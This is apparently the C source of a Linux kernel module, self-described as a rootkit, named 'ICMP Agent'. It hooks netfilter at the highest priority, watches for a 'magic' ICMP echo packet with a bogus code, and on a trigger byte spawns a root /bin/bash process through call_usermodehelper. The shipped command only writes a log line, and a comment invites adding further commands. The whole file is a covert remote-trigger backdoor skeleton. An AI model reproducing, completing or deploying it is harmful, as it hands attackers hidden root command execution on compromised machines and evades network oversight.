/************************************************************************************************
 * ICMP Agent - Root kit for detecting a 'magic' icmp packet via netfilter and optionally spawning 
 * a userland process or sending back an icmp packet contianing some embedded data.
 ************************************************************************************************/

/* ===============================================================================================
 * defines
 * ===============================================================================================*/

#define DEBUG
#define TRIGGER_CODE 0x5B // 91
#define REPLY_SIZE 36 // limiting response to 36-bytes

/* ===============================================================================================
 * includes
 * ===============================================================================================*/

/* standard includes */
#include <linux/module.h>  // Needed by all kernel modules
#include <linux/kernel.h>  // Needed for loglevels (KERN_WARNING, KERN_EMERG, KERN_INFO, etc.)
#include <linux/init.h>    // Needed for __init and __exit macros.

/* netfliter specific includes */
#include <linux/netfilter.h> 
#include <linux/netfilter_ipv4.h> 
#include <linux/net.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/icmp.h>

/* required for user-space runner*/
#include <linux/rculist.h>
#include <linux/sysfs.h>
#include <linux/delay.h>
/* ===============================================================================================
 * module functions
 * ===============================================================================================*/

/* Function for spawning user process
 * @param argv: list of chars where argv[0] is executable, argv[1]->argv[n] are arguments and 
 *  argv[-1] == NULL
 * */
int usp_runner(char *argv[]) {
    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* Function for logging route of recieved packed
 * @param sport: source port
 * @param dport: dest. port
 * @param saddr: source address
 * @param daddr: dest. address
 * @param type: type of traffic e.g. TCP, UDP, etc.
 * */
void print_route(unsigned int sport, unsigned int dport, char *saddr, char *daddr, char *type) {
    #ifdef DEBUG
        if(dport == 0 || sport == 0) {
            printk(KERN_INFO ">>> %s packet: %s -> %s\n", type, saddr, daddr);
        } else {
            printk(KERN_INFO ">>> %s packet: %s:%d -> %s:%d\n", type, saddr, sport, daddr, dport);
        }
    #endif
    return;
}

/* Hook function for packets of interest.
 * @param priv:
 * @param skb: pointer to the sk_buff structure with the packet to be handled.
 * @param nf_hook_state: 
 */
unsigned int hook_func(
    void *priv,
    struct sk_buff *skb,
    const struct nf_hook_state *state
    ) 
{
    /* locals */
    struct iphdr *ip_header;                // struct to copy ip header over to
    struct icmphdr *icmp_header;            // struct to copy icmp header over to
    char *icmp_data = NULL;                 // icmp data buffer
    char source_addr[16], dest_addr[16];    // source/destination IP address
    int icmp_payload_size;                  // size of incoming icmp packet payload
    
    char *argv[] ={"/bin/bash", "-c", "logger \"Hello from user-land; I was spawned in kernel-land!\"", NULL } ;

    /* get network header */
    if(!skb) { return NF_ACCEPT; }    

    ip_header = ip_hdr(skb);
    if(!ip_header) { return NF_ACCEPT; }    

    /* get source and destination pf packet */
    snprintf(source_addr, 16, "%pI4", &ip_header->saddr);
    snprintf(dest_addr, 16, "%pI4", &ip_header->daddr);

    if(ip_header->protocol == IPPROTO_ICMP) {
        print_route(0, 0, source_addr, dest_addr, "ICMP");
        
        icmp_header = icmp_hdr(skb); // icmp header
        if(!icmp_header) { return NF_ACCEPT; }
        
        icmp_data = (char *)((unsigned char *)ip_header + 28); // icmp data
        if(!icmp_data) { return NF_ACCEPT; };
        #ifdef DEBUG
            printk(KERN_INFO "data len: %d\ndata: %s\n", (int)strlen(icmp_data), icmp_data);
        #endif

        /* check for magic packet*/
        icmp_payload_size = htons(ip_header->tot_len ) - sizeof(struct iphdr) - sizeof(struct icmphdr);

        if (icmp_header->code == TRIGGER_CODE &&  // check for bogus ICMP subtype
            icmp_header->type == ICMP_ECHO &&     // this should be an ICMP ECHO request (code 8)
            REPLY_SIZE < icmp_payload_size) {     // make sure our modified payload can fit into original packet 
        
            /* get command */
            #ifdef DEBUG
                printk(KERN_INFO "Found magic packet!\n");
                // printk(KERN_INFO "data len: %d\ndata: %s\n", (int)strlen(icmp_data), icmp_data); 
                printk(KERN_INFO "first byte: %d\n", icmp_data[0]);
            #endif

            switch(icmp_data[0]) {
                case 'S':
                    #ifdef DEBUG
                        printk(KERN_INFO "executing user process\n");
                    #endif
                    msleep(1000);
                    usp_runner(argv);
                    break;
                // add additional commands here
                }
        }
    }
    
    return NF_ACCEPT;
}

static struct nf_hook_ops nfho = {      // struct holding set of hook function options
    .hook       = hook_func,            //function to call when conditions below met
    .hooknum    = NF_INET_PRE_ROUTING,  //called right after packet recieved, first hook in Netfilter
    .pf         = PF_INET,              // IPV4 packets
    .priority   = NF_IP_PRI_FIRST       // set highest priority over all other hook fuctions
};

/* ================================================================================================
 * entry function
 * ================================================================================================*/
static int __init onload(void) {
    /* register hook */
    nf_register_hook(&nfho);
    
    #ifdef DEBUG
        printk(KERN_EMERG "Loadable module initialized\n"); 
    #endif
    return 0;
}


/* ================================================================================================
 * exit function
 * ================================================================================================*/
static void __exit onunload(void) {
    nf_unregister_hook(&nfho);
 
    #ifdef DEBUG
        printk(KERN_EMERG "Loadable module removed\n");
    #endif
}


/* ================================================================================================
 * register entry/exit functions
 * ================================================================================================*/
module_init(onload);
module_exit(onunload);


/* ================================================================================================
 * metadata
 * ================================================================================================*/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mark Mester <mmester@parrylabs.com>");
MODULE_DESCRIPTION("ICMP Agent");

// EOF
